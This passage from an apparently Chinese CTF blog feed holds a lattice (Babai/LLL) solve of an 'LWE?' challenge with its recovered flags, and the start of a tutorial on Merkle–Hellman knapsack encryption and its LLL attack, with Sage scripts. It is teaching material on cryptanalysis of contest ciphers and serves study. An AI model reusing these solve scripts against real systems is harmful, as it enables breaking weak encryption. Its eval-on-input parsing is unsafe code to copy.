tmp.decrypt(c)</span><br><span class="line">        if b&#x27;DASCTF&#x27; in flag:</span><br><span class="line">            print(flag)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"># b&#x27;DASCTF&#123;b437acf4-aaf8-4f8f-ad84-5b1824f5af9c&#125;<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14<span class="symbol">\x</span>14&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>DASCTF{b437acf4-aaf8-4f8f-ad84-5b1824f5af9c}</p></blockquote><h1 id="lwe"><a href="#lwe" class="headerlink" title="lwe?"></a>lwe?</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><ul><li><p>lwe</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from secret import secret</span><br><span class="line">assert len(secret)==<span class="number">66</span>*<span class="number">3</span></span><br><span class="line"><span class="built_in">sec</span> = [ord(x) <span class="keyword">for</span> x <span class="keyword">in</span> secret]</span><br><span class="line"></span><br><span class="line">DEBUG = False</span><br><span class="line">m = <span class="number">66</span></span><br><span class="line">n = <span class="number">200</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">2</span>^<span class="number">20</span></span><br><span class="line"></span><br><span class="line">def errorV():</span><br><span class="line">  <span class="built_in">return</span> <span class="built_in">vector</span>(ZZ, [<span class="number">1</span> - randrange(p) <span class="keyword">for</span> <span class="symbol">_</span> <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line">def matrixMn():</span><br><span class="line">  <span class="built_in">return</span> <span class="built_in">matrix</span>(ZZ, [[q//<span class="number">2</span> - randrange(q) <span class="keyword">for</span> <span class="symbol">_</span> <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> <span class="symbol">_</span> <span class="keyword">in</span> <span class="built_in">range</span>(m)])</span><br><span class="line"></span><br><span class="line">A, B, C = matrixMn(), matrixMn(), matrixMn()</span><br><span class="line">x = <span class="built_in">vector</span>(ZZ, <span class="built_in">sec</span>[<span class="number">0</span>:m])</span><br><span class="line">y = <span class="built_in">vector</span>(ZZ, <span class="built_in">sec</span>[m:<span class="number">2</span>*m])</span><br><span class="line">z = <span class="built_in">vector</span>(ZZ, <span class="built_in">sec</span>[<span class="number">2</span>*m:<span class="number">3</span>*m])</span><br><span class="line">e = errorV()</span><br><span class="line">b = x*A+y*B+z*C+e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">  <span class="built_in">print</span>(&#x27;x = <span class="built_in">%s</span>&#x27; <span class="symbol">%</span> x)</span><br><span class="line">  <span class="built_in">print</span>(&#x27;y = <span class="built_in">%s</span>&#x27; <span class="symbol">%</span> y)</span><br><span class="line">  <span class="built_in">print</span>(&#x27;z = <span class="built_in">%s</span>&#x27; <span class="symbol">%</span> z)</span><br><span class="line">  <span class="built_in">print</span>(&#x27;e = <span class="built_in">%s</span>&#x27; <span class="symbol">%</span> e)</span><br><span class="line"><span class="built_in">print</span>(&#x27;A = \n%s&#x27; <span class="symbol">%</span> A)</span><br><span class="line"><span class="built_in">print</span>(&#x27;B = \n%s&#x27; <span class="symbol">%</span> B)</span><br><span class="line"><span class="built_in">print</span>(&#x27;C = \n%s&#x27; <span class="symbol">%</span> C)</span><br><span class="line"><span class="built_in">print</span>(&#x27;b = <span class="built_in">%s</span>&#x27; <span class="symbol">%</span> b)</span><br></pre></td></tr></table></figure></li><li><p><a href="http://cun.harry0597.com/CTF%2Fout.txt">out</a></p></li></ul><h2 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h2><ul><li><p>读取好数据</p><p>将out文件里的双空格全替换改为了单空格，才写的代码</p></li><li><p>将x、y、z横着堆叠成$1×198$的矩阵，将A、B、C竖着堆叠成$198×200$的矩阵，发现是GGH</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/IMG_63200FAC29CB-1.jpeg" alt="LWE?GGH!"></p><p>搜到babai的方法(<strong>并不是最优解，跑了快十分钟</strong>)可忽略e，求出明文</p><p><a href="https://www.bnessy.com/archives/long-yuan-zhan--yi-2021writeup">https://www.bnessy.com/archives/long-yuan-zhan--yi-2021writeup</a></p></li><li><p>按照uuid的格式拼写好flag</p></li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from sage.modules.free_module_integer import <span class="symbol">IntegerLattice</span></span><br><span class="line">print(<span class="string">&#x27;st4r3!&#x27;</span>)</span><br><span class="line">with open(<span class="string">&#x27;out.txt&#x27;</span>) as f:</span><br><span class="line">    data = (f.read()).split(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    tmp_A = data[<span class="number">1</span>][:-<span class="number">3</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;,&#x27;</span>).split(<span class="string">&#x27;]&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="symbol">A</span> = []</span><br><span class="line">    for i in range(len(tmp_A)):</span><br><span class="line">        if i == <span class="number">0</span>:</span><br><span class="line">            tmp = tmp_A[i][<span class="number">1</span>:]+<span class="string">&#x27;]&#x27;</span></span><br><span class="line">        else:</span><br><span class="line">            tmp = tmp_A[i]+<span class="string">&#x27;]&#x27;</span></span><br><span class="line">        eval(<span class="string">&#x27;A.append(&#123;0&#125;)&#x27;</span>.format(tmp))</span><br><span class="line"></span><br><span class="line">    tmp_B = data[<span class="number">2</span>][:-<span class="number">3</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;,&#x27;</span>).split(<span class="string">&#x27;]&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="symbol">B</span> = []</span><br><span class="line">    for i in range(len(tmp_B)):</span><br><span class="line">        if i == <span class="number">0</span>:</span><br><span class="line">            tmp = tmp_B[i][<span class="number">1</span>:] + <span class="string">&#x27;]&#x27;</span></span><br><span class="line">        else:</span><br><span class="line">            tmp = tmp_B[i] + <span class="string">&#x27;]&#x27;</span></span><br><span class="line">        eval(<span class="string">&#x27;B.append(&#123;0&#125;)&#x27;</span>.format(tmp))</span><br><span class="line"></span><br><span class="line">    tmp_C = data[<span class="number">3</span>][:-<span class="number">3</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;,&#x27;</span>).split(<span class="string">&#x27;]&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="symbol">C</span> = []</span><br><span class="line">    for i in range(len(tmp_C)):</span><br><span class="line">        if i == <span class="number">0</span>:</span><br><span class="line">            tmp = tmp_C[i][<span class="number">1</span>:] + <span class="string">&#x27;]&#x27;</span></span><br><span class="line">        else:</span><br><span class="line">            tmp = tmp_C[i] + <span class="string">&#x27;]&#x27;</span></span><br><span class="line">        eval(<span class="string">&#x27;C.append(&#123;0&#125;)&#x27;</span>.format(tmp))</span><br><span class="line"></span><br><span class="line">    b = []</span><br><span class="line">    eval(<span class="string">&#x27;b.append(&#123;0&#125;)&#x27;</span>.format(data[<span class="number">4</span>].replace(<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;[&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;]&#x27;</span>)))</span><br><span class="line"><span class="symbol">AA</span> = []    </span><br><span class="line">for i in <span class="symbol">A</span>:</span><br><span class="line">    <span class="symbol">AA</span>.append(i)</span><br><span class="line">for i in <span class="symbol">B</span>:</span><br><span class="line">    <span class="symbol">AA</span>.append(i)</span><br><span class="line">for i in <span class="symbol">C</span>:</span><br><span class="line">    <span class="symbol">AA</span>.append(i)</span><br><span class="line"></span><br><span class="line">c = b[<span class="number">0</span>]</span><br><span class="line"><span class="symbol">W</span> = <span class="symbol">AA</span></span><br><span class="line"></span><br><span class="line">c = vector(c)</span><br><span class="line"><span class="symbol">W</span> = matrix(<span class="symbol">W</span>)</span><br><span class="line">def babai(<span class="symbol">A</span>, w):</span><br><span class="line">    <span class="symbol">A</span> = <span class="symbol">A</span>.<span class="symbol">LLL</span>()</span><br><span class="line">    <span class="symbol">G</span> = <span class="symbol">A</span>.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">    t = w</span><br><span class="line">    for i in reversed(range(<span class="symbol">A</span>.nrows())):</span><br><span class="line">        c = ((t * <span class="symbol">G</span>[i]) / (<span class="symbol">G</span>[i] * <span class="symbol">G</span>[i])).round()</span><br><span class="line">        t -= <span class="symbol">A</span>[i] * c</span><br><span class="line">    return w - t</span><br><span class="line"><span class="symbol">V</span> = babai(<span class="symbol">W</span>,c)</span><br><span class="line">m = <span class="symbol">V</span>/<span class="symbol">W</span></span><br><span class="line">flag = [chr(i) for i in m]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">m</span> = [<span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;0&#x27;</span>]</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;&#x27;</span>.<span class="keyword">join</span>(<span class="keyword">m</span>))</span><br><span class="line"># Oh, you <span class="built_in">get</span> it?? Here <span class="keyword">is</span> the fla<span class="variable">g:</span> <span class="string">&#x27;DASCTF&#123;uuid&#125;&#x27;</span>. What? You don<span class="string">&#x27;t know the uuid? The first part is &#x27;</span>dcf41556<span class="string">&#x27;, second part-&gt; &#x27;</span>c194<span class="string">&#x27;, and then &#x27;</span><span class="number">4</span>c66<span class="string">&#x27;, &#x27;</span><span class="number">9092</span><span class="string">&#x27;. And finally, it&#x27;</span>s <span class="string">&#x27;059e0bf8b84e&#x27;</span>!!! <span class="number">0</span>v0</span><br></pre></td></tr></table></figure><blockquote><p>DASCTF{dcf41556-c194-4c66-9092-059e0bf8b84e}</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF·背包问题相关</title>
      <link href="/2022/07/21/bag/"/>
      <url>/2022/07/21/bag/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h1><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/hqdefault.jpg" alt="背包"></p><p>背包加密基于背包问题。</p><p>而背包问题，是指设有一个可以载重S的背包，在有 n 个重量分别为 a1,a2,…,an的物品情况下，如何在不重复选择的前提下将物品装入背包且正好使其满载的问题。</p><p>数学表述如下：<br>$$<br>x_1a_1+x_2a_2+···+x_na_n=S, x_i \in (0,1),a_i&gt;0<br>$$<br>实际上，我们可以将明文转换成数字，并将其二进制01码从高位到低位依次作$x_i$.</p><p>公布$a_i$、$S$这样就实现了,利用背包问题来简单加密明文。</p><p>此时，若要破解出$x_i$,爆破攻击的时间复杂度是$O(2^n)$，非常困难也非常安全，但没有意义。</p><p>因为加密的目的，是让指定的人（同时有公私钥的人）能快速解密，而只有公钥的人则无法快速解密。</p><p>如上所述的加密方式，没有这么一种「私钥」能让拥有者快速解出明文$x_i$</p><h2 id="超递增序列"><a href="#超递增序列" class="headerlink" title="超递增序列"></a>超递增序列</h2><p>在讲改进后基于背包问题的背包加密之前，先谈谈超递增序列。</p><p>上文说到「若要破解出$x_i$,爆破攻击的时间复杂度是$O(2^n)$，非常困难」，那么，是否有特殊情况可以快速求出序列X(即$x_i$组成的数列)呢？</p><p>答案是：有。</p><p>这里讲的<strong>超递增序列</strong>即是。</p><p>超递增序列是每一个元素都大于或等于之前所有元素之和的序列，即：<br>$$<br>r_i ≥ r_1 + r_2 + r_3 + ··· + r_{i-1}<br>$$<br>也即:<br>$$<br>r_i ≥ 2 •r_{i-1}<br>$$</p><p>当明文与<strong>超递增序列</strong>依次相乘再求和时<br>$$<br>x_1r_1+x_2r_2+···+x_nr_n=S, x_i \in (0,1),r_i&gt;0<br>$$<br><strong>我们可以通过依次比较S与序列中最大的元素大小关系，来确定该元素性质。</strong></p><p>例如，若$S &gt; r_n$,则$r_n$必然存在于等式左边，即$x_n=1$</p><p>因为哪怕小于$r_n$的所有元素都存在于等式左边，它们的和也小于$r_n$.所以$S$若要大于$r_n$，$r_n$就必须存在。</p><p>接下来，令$S = S - r_n$，再比较$S$与$r_{n-1}$，同理可得$x_{n-1}$</p><p>循环以上步骤，直到确定序列$X$所有元素。</p><p>如此一来，我们知道若用<strong>超递增序列加密明文</strong>，是非常容易可破解出明文的。</p><h2 id="背包加密"><a href="#背包加密" class="headerlink" title="背包加密"></a>背包加密</h2><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/Ralph_Merkle.png" alt="Ralph C. Merkle"></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/Martin-Hellman.jpg" alt="Martin Edward Hellman"></p><blockquote><p>1977年，Merkle与Hellman合作设计了背包加密算法，该算法提出后密码学界提出了很多背包型加密算法。</p></blockquote><p>正如前文所言，背包问题显然不是一个加密体系，若加密所用序列并不特殊，求$x_i$对所有人都很困难。</p><p>于是Merkle–Hellman背包加密算法诞生，其流程如下</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/7HwAdyNEGqDKLat.png" alt="总流程"></p><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><ol start="0"><li><p><strong>明文</strong></p><ul><li><p>明文字符串转数字</p></li><li><p>明文数字转二进制</p></li><li><p>生成明文序列$x=(x_1,x_2,x_3,···,x_n), x_i \in (0,1)$</p><p>$x_i$为明文数字二进制下每一位</p></li></ul></li><li><p><strong>私钥</strong></p><p>生成<strong>超递增序列</strong>$r=(r_1,r_2,r_3,···,r_n)$做私钥序列</p></li><li><p><strong>公钥</strong></p><ul><li>生成模数B，满足$B&gt;\sum\limits_{i=1}^{n}a_i$, 即$B&gt;2r_n$</li><li>生成乘数A，满足$gcd(A,B)=1$</li><li>生成公钥序列$M=(M_1,M_2,M_3,···,M_n)$，其中$M_i ≡ Ar_i \mod B$</li></ul></li><li><p><strong>密文</strong></p><p>生成密文$S = x•M = \sum \limits_{i=1}^{n}x_iM_i$</p></li></ol><p>公布序列M, 乘数A, 模数B, 密文S</p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><ol><li>计算A关于模B的逆元$A^{-1}$</li><li>计算$S’ \equiv A^{-1}S \equiv A^{-1}\sum_{i=1}^{n}x_iM_i\equiv A^{-1}\sum_{i=1}^{n}x_iAr_i\equiv \sum_{i=1}^{n}x_ir_i \mod B$</li><li>利用超递增序列$r$的性质，求解出明文二进制</li><li>明文二进制转数字，再转字符串   </li></ol><p>如上流程，公、私钥拥有者可以计算出$S’$，然后利用超递增序列$r$轻易求解出明文</p><p>仅有公钥者，计算出$S’$后，因为没有序列$r$便无法利用超递增序列的性质求解</p><p>只能看向这个等式<br>$$<br>S = x•M = \sum \limits_{i=1}^{n}x_iM_i<br>$$<br>而若<strong>正常选择好</strong>乘数$A$、序列$r$，模B后的序列$M$各元素（$M_i ≡ Ar_i \mod B$）将丧失原大小顺序性质。</p><p>换言之，攻击者将面临的是上文中背包问题里复杂度为$O(2^n)$的难题，这保障了背包加密的安全性。</p><p>但近些年来，自从有关<strong>LLL</strong>的论文发表后，基于背包的密码系统出现了<strong>致命的漏洞</strong>。</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="参数不当"><a href="#参数不当" class="headerlink" title="参数不当"></a>参数不当</h3><p>正如前文所讲，若乘数$A$、序列$r$大小不当则可能使得乘积过小，即：$Ar_i \mod B = Ar_i$</p><p>那么公钥序列$M$就是肉眼可见的超递增序列了，直接利用性质可求出明文。</p><h3 id="背包问题通解"><a href="#背包问题通解" class="headerlink" title="背包问题通解"></a>背包问题通解</h3><p><strong>当密度$d = \cfrac{len(M)}{\log_2(max(M_i))}&lt;0.9408$时，LLL算法能通杀这类背包问题。</strong></p><p>用公钥序列$M=(M_1,M_2,M_3,···,M_n)$、密文S构造格子<br>$$<br>\left(\begin {array}{c} x_1 \newline \vdots \newline x_{n-1} \newline x_n \newline 0 \end{array} \right) &lt;=&gt;\left(\begin {array}{c} 1 &amp; 0 &amp; \cdots &amp; 0 &amp; M_1 \newline 0 &amp; 1 &amp; \cdots &amp; 0 &amp; M_2 \newline \vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots \newline 0 &amp; 0 &amp; \cdots &amp; 1 &amp; M_n \newline 0 &amp; 0 &amp; \cdots &amp; 0 &amp; S \end{array} \right)<br>$$<br>用LLL求右边格子的最短正交基，即为左边的明文$x$</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="attr">import</span> <span class="string">libnum</span></span><br><span class="line"><span class="attr">M</span> = <span class="string">[]</span></span><br><span class="line"><span class="attr">S</span> = <span class="string"></span></span><br><span class="line"><span class="attr">n</span> = <span class="string">len(M)</span></span><br><span class="line"><span class="attr">Mat</span> = <span class="string">Matrix.identity(n)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">last_row</span> = <span class="string">[0 for x in M]</span></span><br><span class="line"><span class="attr">M_last_row</span> = <span class="string">Matrix(ZZ, 1, len(last_row), last_row)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">last_col</span> = <span class="string">M[:]</span></span><br><span class="line"><span class="attr">last_col.append(S)</span></span><br><span class="line"><span class="attr">M_last_col</span> = <span class="string">Matrix(ZZ, len(last_col), 1, last_col)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Mat</span> = <span class="string">Mat.stack(M_last_row)</span></span><br><span class="line"><span class="attr">Mat</span> = <span class="string">Mat.augment(M_last_col)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">X</span> = <span class="string">Mat.LLL()</span></span><br><span class="line"><span class="comment"># print(X)</span></span><br><span class="line"><span class="attr">for</span> <span class="string">t in X:</span></span><br><span class="line">    <span 